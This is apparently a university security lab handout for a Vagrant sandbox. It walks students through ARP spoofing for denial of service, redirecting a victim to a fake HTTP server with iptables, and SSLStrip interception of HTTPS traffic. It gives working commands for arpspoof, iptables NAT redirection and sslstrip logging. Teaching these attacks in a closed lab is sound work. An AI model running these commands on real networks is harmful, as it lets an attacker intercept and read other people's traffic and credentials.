# CSCD27 Lab 8: ARP spoofing and SSLStripping

## Vagrant Setup

Make sure to setup your environment as described in the [Vagrant Setup Guideline](https://github.com/ThierrySans/CSCD27-F16/blob/master/assignments/02/VAGRANT.md).

## Initial check

*As Alice*, test that Mathlab is reachable:

```shell
vagrant@alice:~$ curl http://mathlab.utsc.utoronto.ca/
```

## ARP Spoofing (Denial Of Service)

In this part, Mallory wants to disrupt the communication between Alice and the Gateway. To do so, Mallory will broadcast spoofed ARP packets to Alice saying that the gateway can be reached through Mallory's physical address.

*As Mallory (terminal 1), broadcast spoofed ARP messages to Alice (10.0.1.101) pretending to be the gateway (10.0.1.100):

```shell
vagrant@mallory:~$ sudo arpspoof -i eth1 -t 10.0.1.101 10.1.100
```

Finally:

- *As Alice*, test that Mathlab is no longer reachable.
- *As Mallory*, use Wireshark to see ARP spoofed messages and failed TCP messages

## ARP Spoofing (fake HTTP server)

In this part, rather than disrupting the communication between Alice and the Gateway, Mallory wants to setup a fake HTTP server pretending to be Mathlab. To do so, Mallory will first redirect HTTP messages to a fake server before spoofing the ARP messages.

*As Mallory* (terminal 2), redirect HTTP traffic (port 80) to port 8080 (Mallory's fake server)

```shell
vagrant@mallory:~$ sudo bash -e "echo '1' > /proc/sys/net/ipv4/ip_forward"
vagrant@mallory:~$ sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
```

*As Mallory* (terminal 2), start a fake HTTP server listening on port 8080

```shell
vagrant@mallory:~$ cd /vagrant/mallory/fake_http
vagrant@mallory:~$ python -m SimpleHTTPServer 8080
```

*As Mallory* (terminal 1), broadcast spoofed ARP messages as done previously

Finally:

- *As Alice*, test that Mathlab is now reachable (but is it really mathlab?)
- *As Mallory*, use Wireshark to see the (fake) HTTP exchange

## ARP Spoofing (fake HTTPS server)

How could Mallory setup the attack if Alice tries to connect to Mathlab using HTTPS?

```shell
vagrant@alice:~$ curl https://mathlab.utsc.utoronto.ca/
```

## SSLStripping

In this part, rather than redirecting Alice to a fake HTTPS server, Mallory wants to relay traffic between Alice and Mathlab as a man-in-the-middle attack. The goal is to fool Alice into sending non-encrypted HTTPS requests to Mallory.

*As Mallory* (terminal 2), forward all HTTPS traffic to the SSLStrip proxy.

```shell
vagrant@mallory:~$ cd sslstrip-0.9
vagrant@mallory:~$ python sslstrip.py -a -w log.txt -l 8080 -f
```

Finally:

- *As Alice*, test that (real) Mathlab is now reachable with HTTPS
- *As Mallory*, open the file `log.txt` and see all HTTPS traffic